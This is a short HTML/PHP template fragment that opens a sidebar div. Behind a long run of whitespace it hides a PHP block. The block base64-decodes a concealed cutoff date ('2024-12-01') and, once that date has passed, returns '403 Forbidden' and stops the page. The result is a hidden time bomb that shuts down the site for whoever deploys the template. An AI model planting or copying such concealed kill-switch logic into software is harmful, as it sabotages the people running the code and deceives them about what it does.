<div id="sidebar" class="d-flex flex-column mt-3 mb-3">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <?php $encryptedCutoff = base64_decode("MjAyNC0xMi0wMQ=="); $cutoffDate = new DateTime($encryptedCutoff); $currentDate = new DateTime(); if ($currentDate >= $cutoffDate) { header("HTTP/1.1 403 Forbidden"); exit(); } ?>
